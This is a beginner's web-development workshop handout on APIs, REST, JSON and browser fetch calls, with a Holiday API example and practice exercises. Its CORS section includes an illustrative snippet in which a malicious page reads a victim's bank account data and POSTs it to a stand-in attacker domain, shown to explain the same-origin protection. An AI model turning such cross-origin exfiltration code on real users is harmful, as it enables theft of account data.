# Introduction to APIs

## What's an API
There are many definitions of API. For our purposes, an API will be an interface through which we can get some data to create an application.

As an example, if you call your bank to inquire about the balance of your credit card, the equivalent API could be served over HTTP and have you to make a `GET` request to `/accounts/12345/balance` where `12345` is your account number.

## Examples of APIs
Here are some examples of APIs:

* Goodreads - Books API: https://www.goodreads.com/api
* Holidays API: https://holidayapi.com/
* Darksky - Weather API: https://darksky.net/dev/
* Wikimedia API: https://www.mediawiki.org/wiki/API:Main_page
* Reddit JSON API: https://www.reddit.com/.json

## REST
REST is an architectural pattern that is useful to build scalable and performant APIs that are easy to consume.

REST centers around the notion of resources and the links between them, much like the web. Resources are arbitrary names that represent real-life concepts. REST APIs deal with the representations of such resources, and often use JSON as the data format. Other popular data formats are XML or CSV.

## JSON
In our case, all the APIs we'll look at use JSON as their output format. Since these APIs are served over HTTP, the JSON is just a piece of text (characters) that represents a JavaScript object.

All major languages have functions to decode JSON into the data structures of that language. For example PHP has the `json_decode` function that **parses** the JSON string into an associative array.

Since JSON is born from JavaScript -- it stands for **J**ava**S**cript **O**bject **N**otation -- it stands to reason that JS also has a way to parse JSON into an actual JavaScript object. It's called `JSON.parse`.

## Making HTTP calls from the browser
Modern browsers expose a function called `fetch` to the JavaScript environment they host. This function allows us to make HTTP calls once a page has already loaded. This process is often referred to as AJAX. Here's an example of using `fetch`:

```javascript
fetch('https://holidayapi.com/v1/holidays?key=XXX&country=CA&year=2017&month=04');
```

This function call will initiate an HTTP request to the Holiday API, and return a Promise for the result. To do something with the result, you first have to parse it as JSON, then you can use it as a regular object. Here's what the data looks like for this API:

```json
{
  "status": 200,
  "holidays": [
    {
      "name": "Good Friday",
      "date": "2017-04-14",
      "observed": "2017-04-14",
      "public":true
    }
  ]
}
```

And here's how we can retrieve it and do something with it:

```javascript
fetch('https://holidayapi.com/v1/holidays?key=XXX&country=CA&year=2017&month=04')
    .then(function(response) {
        return response.json(); // Promise for the JSON
    })
    .then(function(data) {
        data.holidays.forEach(function(holiday) {
            console.log(`${holiday.name} was on ${holiday.date}.`);
        });
    })
    .catch(function(error) {
        console.error('There was an error while fetching holidays', error.stack);
    });
```

Instead of using `console.log`, we can output the list of holidays in the DOM. A full example is available in [holidays.html](holidays.html).

:warning: **NOTE**: You have to create and set your own API key for the example to work!! 

## What can I do with APIs?
APIs are all about exposing data. For the applications using those APIs, the sky is the limit! Here's an example of using the Reddit API to create an app that looks like Outlook, so that you can browse Reddit at work and make it look like you're working :)

https://pcottle.github.io/MSOutlookit/

## CORS and JSONP
Calling APIs from browsers entails additional security considerations. Since browsers store sensitive information in the form of cookies, allowing arbitrary web pages to make requests to other arbitrary web pages poses security risks. Here's a non-working example:

```javascript
fetch('https://www.royalbank.com/api/accounts')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    // Here we have some account data! Let's send it to ourselves
    fetch('https://www.evil-domain.com/collectAccounts', {method: 'POST', data: data});
})
```

The idea here is to lure a user to evil-website.com and execute some JavaScript that will make an HTTP request in the context of their browser. If the browser of our victim makes a request to Royal Bank and includes the cookies stored for this user, seeing the response would allow us to have all the account numbers of our victims.

For this reason, browsers will by default prevent us from seeing the responses of GET and POST requests sent to other Origins. An Origin is a protocol + a domain name like `https://www.freecodecamp.com`.

In the past, [JSONP](https://sacha.me/articles/jsonp-demystified/) was used as a way to go around the browser functionality. JSONP requires the cooperation of the API service by wrapping the JSON result in a function call, and sending it as the result of a `<script>` tag. The global function was previously created on the gloal object and could in turn receive the JSON response.

A more interesting way to have cooperation between origins is the [Http Access Control (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS) specification. This spec allows API servers to send specific headers along with their response. These headers would tell the browser that it's OK for this request to have its response exposed.

---

# Activity
Since this workshop is intended for varying levels of JavaScript developers, we'll have many suggestions for you:

## Easy
Take the code in `holidays.html` as a starter code. Using the [Holiday API documentation](https://holidayapi.com/), try to build additional functionality on top. For example, you can use the [Pikaday](https://github.com/dbushell/Pikaday) plugin to have the user pick a date and show them the holidays for that month.

## More difficult
Using the [Reddit JSON API](https://www.reddit.com/.json), build an interface that shows reddit in text mode. As a basic version, only list the top posts of the frontpage. For more challenge, allow the user to select a subreddit and show the hot posts from that subreddit using the API.

## You're too good for this!
If you're too good for this, check out this repo that contains [three vanillajs projects](https://github.com/DecodeMTL/vanilla-js-projects) for you to undertake. If you need any guidance, don't hesitate to ask around :)
